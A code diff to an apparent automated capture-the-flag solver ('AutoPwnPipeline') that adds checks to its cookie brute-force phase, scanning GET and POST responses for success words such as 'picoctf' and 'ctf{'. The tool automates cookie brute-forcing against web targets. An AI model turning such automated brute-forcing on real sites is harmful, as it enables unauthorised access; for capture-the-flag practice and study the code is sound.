@@ -1224,6 +1224,17 @@ class AutoPwnPipeline:
                             print_success(f"  Flag captured by setting cookie '{cname}' to '{val}' on {ep}!")
                             found_flag = True
                             break
+                        # Also check for success indicators in GET response body
+                        if any(k in r.text.lower() for k in ["flag", "congratulations", "correct", "success", "winner", "you got it", "picoctf", "ctf{", "not the right", "wrong cookie"]):
+                            # 'not the right' / 'wrong cookie' are failure indicators - skip
+                            if any(k in r.text.lower() for k in ["not the right", "wrong cookie", "invalid", "not found", "try again"]):
+                                pass
+                            else:
+                                print_success(f"  [Cookie BF] Success indicator found for '{cname}'='{val}' on {ep} (GET)!")
+                                self._log_step("Phase 4: Cookie BF", f"Success indicator for {cname}={val}", details=ep)
+                                self._check_and_store_flags(r.text, f"Cookie BF success ({cname}={val})")
+                                found_flag = True
+                                break
                         # If endpoint is search-like, also try POST with the cookie value as form data
                         if is_post_endpoint:
                             r = self.session.post(ep, data={cname: val}, cookies={cname: val}, timeout=5)
@@ -1231,6 +1242,17 @@ class AutoPwnPipeline:
                                 print_success(f"  Flag captured by setting cookie '{cname}' to '{val}' on {ep} (POST)!")
                                 found_flag = True
                                 break
+                            # Also check for success indicators in the response body
+                            # (some challenges reveal the flag in a different format or page)
+                            if any(k in r.text.lower() for k in ["flag", "congratulations", "correct", "success", "winner", "you got it", "picoctf", "ctf{"]):
+                                if any(k in r.text.lower() for k in ["not the right", "wrong cookie", "invalid", "not found", "try again"]):
+                                    pass
+                                else:
+                                    print_success(f"  [Cookie BF] Success indicator found for '{cname}'='{val}' on {ep} (POST)!")
+                                    self._log_step("Phase 4: Cookie BF", f"Success indicator for {cname}={val}", details=ep)
+                                    self._check_and_store_flags(r.text, f"Cookie BF success ({cname}={val})")
+                                    found_flag = True
+                                    break
                     except Exception:
                         pass
                 if found_flag:
